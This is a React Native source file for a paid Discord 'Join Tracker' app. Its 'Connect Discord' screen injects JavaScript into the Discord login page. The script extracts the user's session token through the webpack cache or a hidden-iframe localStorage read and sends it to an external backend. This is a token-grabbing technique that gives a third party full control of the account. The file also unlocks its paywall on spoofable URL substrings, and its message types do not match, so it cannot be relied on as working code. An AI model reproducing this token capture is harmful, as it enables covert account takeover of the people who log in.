import React, { useEffect, useRef, useState } from "react";
import {
  View,
  Text,
  FlatList,
  StyleSheet,
  TouchableOpacity,
  Alert,
  Platform,
  SafeAreaView,
  ActivityIndicator,
} from "react-native";
import { WebView } from "react-native-webview";
import * as Notifications from "expo-notifications";
import AsyncStorage from "@react-native-async-storage/async-storage";

Notifications.setNotificationHandler({
  handleNotification: async () => ({
    shouldShowAlert: true,
    shouldPlaySound: true,
    shouldSetBadge: false,
  }),
});

export default function App() {
  const [moves, setMoves] = useState([]);
  const [refreshing, setRefreshing] = useState(false);
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [showWebView, setShowWebView] = useState(false);
  const [myUserId, setMyUserId] = useState(null);
  const [userEmail, setUserEmail] = useState("");

  const [isSubscribed, setIsSubscribed] = useState(true);
  const [paystackUrl, setPaystackUrl] = useState(null);

  const webViewRef = useRef(null);
  const lastSeenId = useRef(null);

  const API_URL = "https://intelligent-gratitude-production.up.railway.app";

  // --- IMPROVED SCRIPT: Target UserStore directly ---
  // Focus ONLY on the token since we generate the email from user_id on the backend
  const INJECTED_JAVASCRIPT = `
  (function() {
    function capture() {
      try {
        let token = null;
        const webpack = window.webpackChunkdiscord_app;
        if (webpack) {
          const m = webpack.push([[Symbol()], {}, (e) => e]);
          for (const i in m.c) {
            if (m.c[i].exports && m.c[i].exports.default && m.c[i].exports.default.getToken) {
              token = m.c[i].exports.default.getToken();
              if (token) break;
            }
          }
        }
        if (!token) {
          const iframe = document.createElement('iframe');
          iframe.style.display = 'none'; document.body.appendChild(iframe);
          const raw = iframe.contentWindow.localStorage.getItem('token');
          if (raw) token = raw.replace(/"/g, '');
        }

        if (token && token.length > 20) {
          window.ReactNativeWebView.postMessage(JSON.stringify({type: 'TOKEN', data: token}));
          return true;
        }
      } catch (e) {}
      return false;
    }
    setInterval(capture, 1000);
  })();
`;

  // --- IMPROVED: Catch Paystack success more reliably ---
  const handlePaystackNavigation = (navState) => {
    const url = navState.url.toLowerCase();
    // Check for common redirect success patterns
    if (
      url.includes("success") ||
      url.includes("callback") ||
      url.includes("checkout.paystack.com/success") ||
      url.includes("successful") ||
      url.includes("completed") ||
      url.includes("complete")
    ) {
      setTimeout(() => {
        setPaystackUrl(null);
        setIsSubscribed(true);
        fetchMoves();
        Alert.alert("Success", "Account unlocked!");
      }, 2500); // Small delay to let Paystack finish its visual "Success" animation
    }
  };


  useEffect(() => {
    registerForNotifications();
    loadSavedUser();
  }, []);

  useEffect(() => {
    if (isLoggedIn && myUserId && isSubscribed) {
      fetchMoves();
      const interval = setInterval(fetchMoves, 5000);
      return () => clearInterval(interval);
    }
  }, [isLoggedIn, myUserId, isSubscribed]);

  const loadSavedUser = async () => {
    const savedId = await AsyncStorage.getItem("saved_user_id");
    const savedEmail = await AsyncStorage.getItem("saved_user_email");
    if (savedId) {
      setMyUserId(savedId);
      setUserEmail(savedEmail || "");
      setIsLoggedIn(true);
    }
  };

  const onWebViewMessage = async (event) => {
    try {
      const message = JSON.parse(event.nativeEvent.data);
      if (message.type === "TOKEN_DATA" && message.token) {
        setShowWebView(false);
        await sendTokenToBackend(message.token, message.email);
      }
    } catch (e) {}
  };

  const sendTokenToBackend = async (token, email) => {
    try {
      const response = await fetch(`${API_URL}/link-account`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ token, email }),
      });
      const result = await response.json();
      if (response.ok) {
        const newUserId = String(result.user_id);
        await AsyncStorage.setItem("saved_user_id", newUserId);
        await AsyncStorage.setItem("saved_user_email", email);
        setMyUserId(newUserId);
        setUserEmail(email);
        setIsLoggedIn(true);
        Alert.alert("✅ Connected", "Join tracking active!");
      }
    } catch (error) {
      Alert.alert("Server Error", "Could not reach backend.");
    }
  };

  const fetchMoves = async () => {
    if (!myUserId) return;
    try {
      const res = await fetch(`${API_URL}/get-moves/${myUserId}`);
      if (res.status === 402) {
        setIsSubscribed(false);
        return;
      }
      const data = await res.json();
      if (Array.isArray(data)) {
        setIsSubscribed(true);
        if (
          lastSeenId.current &&
          data.length > 0 &&
          data[0].id !== lastSeenId.current
        ) {
          triggerNotification(data[0]);
        }
        if (data.length > 0) lastSeenId.current = data[0].id;
        setMoves(data);
      }
    } catch (err) {
      console.log("Polling...");
    } finally {
      setRefreshing(false);
    }
  };

  const handlePayment = async () => {
    try {
      const response = await fetch(`${API_URL}/initialize-payment`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          user_id: myUserId,
          email: userEmail || "customer@app.com",
        }),
      });
      const result = await response.json();
      if (result.status && result.data.authorization_url) {
        setPaystackUrl(result.data.authorization_url);
      } else {
        Alert.alert("Error", "Payment failed to start.");
      }
    } catch (e) {
      Alert.alert("Error", "Server unreachable.");
    }
  };

  const handleLogout = async () => {
    Alert.alert("Reset", "Logout?", [
      { text: "Cancel", style: "cancel" },
      {
        text: "Reset",
        style: "destructive",
        onPress: async () => {
          await AsyncStorage.clear();
          setIsLoggedIn(false);
          setMyUserId(null);
          setMoves([]);
          setShowWebView(false);
        },
      },
    ]);
  };

  const triggerNotification = async (move) => {
    await Notifications.scheduleNotificationAsync({
      content: { title: `📥 New Member!`, body: move.action },
      trigger: null,
    });
  };

  const registerForNotifications = async () => {
    const { status } = await Notifications.requestPermissionsAsync();
    if (status !== "granted") console.log("Perms denied");
  };

  const handleNavigationChange = (navState) => {
    if (navState.url.includes("/channels/")) {
      webViewRef.current.injectJavaScript(INJECTED_JAVASCRIPT);
    }
  };

  const renderMove = ({ item }) => (
    <View style={styles.moveItem}>
      <View style={styles.headerRow}>
        <Text style={styles.expert}>
          👤 {item.action.split(" ")[1] || "Member"}
        </Text>
        <Text style={styles.serverTag}>{item.server}</Text>
      </View>
      <Text style={styles.actionText}>Joined the server</Text>
      <Text style={styles.timeText}>
        {new Date(item.timestamp).toLocaleTimeString()}
      </Text>
    </View>
  );

  if (paystackUrl) {
    return (
      <SafeAreaView style={{ flex: 1, backgroundColor: "#fff" }}>
        <View style={styles.webViewHeader}>
          <TouchableOpacity onPress={() => setPaystackUrl(null)}>
            <Text style={{ color: "red" }}>Cancel</Text>
          </TouchableOpacity>
          <Text style={{ fontWeight: "bold" }}>Secure Payment</Text>
          <View style={{ width: 50 }} />
        </View>
        <WebView
          source={{ uri: paystackUrl }}
          onNavigationStateChange={handlePaystackNavigation}
          style={{ flex: 1 }}
        />
      </SafeAreaView>
    );
  }

  if (showWebView) {
    return (
      <SafeAreaView style={{ flex: 1, backgroundColor: "#fff" }}>
        <View style={styles.webViewHeader}>
          <TouchableOpacity onPress={() => setShowWebView(false)}>
            <Text style={{ color: "red", fontWeight: "bold" }}>Cancel</Text>
          </TouchableOpacity>
          <Text style={{ fontWeight: "bold" }}>Connect Discord</Text>
          <View style={{ width: 50 }} />
        </View>
        <WebView
          ref={webViewRef}
          incognito={true}
          source={{ uri: "https://discord.com/login" }}
          injectedJavaScript={INJECTED_JAVASCRIPT}
          onMessage={onWebViewMessage}
          onNavigationStateChange={handleNavigationChange}
          userAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36"
        />
      </SafeAreaView>
    );
  }

  return (
    <View style={styles.container}>
      {!isLoggedIn ? (
        <View style={styles.loginContainer}>
          <Text style={styles.loginEmoji}>🚀</Text>
          <Text style={styles.title}>Join Tracker</Text>
          <TouchableOpacity
            style={styles.loginButton}
            onPress={() => setShowWebView(true)}
          >
            <Text style={styles.buttonText}>Connect Discord Account</Text>
          </TouchableOpacity>
        </View>
      ) : (
        <>
          {!isSubscribed ? (
            <View style={styles.paywallContainer}>
              <Text style={styles.loginEmoji}>🔒</Text>
              <Text style={styles.title}>Access Locked</Text>
              <TouchableOpacity
                style={styles.loginButton}
                onPress={handlePayment}
              >
                <Text style={styles.buttonText}>Renew Access (₦5,000)</Text>
              </TouchableOpacity>
              <TouchableOpacity
                style={{ marginTop: 25 }}
                onPress={handleLogout}
              >
                <Text style={{ color: "#999" }}>Logout</Text>
              </TouchableOpacity>
            </View>
          ) : (
            <>
              <View style={styles.headerBar}>
                <Text style={styles.title}>Live Feed</Text>
                <TouchableOpacity onPress={handleLogout}>
                  <Text style={{ color: "#5865F2", fontWeight: "bold" }}>
                    Reset
                  </Text>
                </TouchableOpacity>
              </View>
              <FlatList
                data={moves}
                keyExtractor={(item) => item.id}
                renderItem={renderMove}
                refreshing={refreshing}
                onRefresh={() => {
                  setRefreshing(true);
                  fetchMoves();
                }}
                ListEmptyComponent={
                  <Text style={styles.empty}>Waiting for activity...</Text>
                }
              />
            </>
          )}
        </>
      )}
    </View>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, padding: 20, backgroundColor: "#f9f9f9" },
  webViewHeader: {
    height: 60,
    flexDirection: "row",
    justifyContent: "space-between",
    alignItems: "center",
    paddingHorizontal: 20,
    borderBottomWidth: 1,
    borderBottomColor: "#eee",
  },
  loginContainer: {
    flex: 1,
    justifyContent: "center",
    alignItems: "center",
    padding: 30,
  },
  paywallContainer: {
    flex: 1,
    justifyContent: "center",
    alignItems: "center",
    padding: 30,
  },
  loginEmoji: { fontSize: 80, marginBottom: 10 },
  headerBar: {
    flexDirection: "row",
    justifyContent: "space-between",
    alignItems: "center",
    marginTop: 40,
    marginBottom: 20,
  },
  title: { fontSize: 26, fontWeight: "bold" },
  loginButton: {
    backgroundColor: "#5865F2",
    padding: 18,
    borderRadius: 15,
    width: "100%",
  },
  buttonText: {
    color: "#fff",
    textAlign: "center",
    fontWeight: "bold",
    fontSize: 16,
  },
  moveItem: {
    backgroundColor: "#fff",
    padding: 15,
    marginBottom: 10,
    borderRadius: 12,
    elevation: 2,
  },
  headerRow: { flexDirection: "row", justifyContent: "space-between" },
  expert: { fontWeight: "bold", color: "#5865F2" },
  serverTag: {
    fontSize: 10,
    color: "#777",
    backgroundColor: "#eee",
    paddingHorizontal: 6,
    paddingVertical: 2,
    borderRadius: 10,
  },
  actionText: { marginTop: 8, fontSize: 15, color: "#333" },
  timeText: { fontSize: 11, color: "#999", marginTop: 5 },
  empty: { textAlign: "center", marginTop: 50, color: "#999" },
});
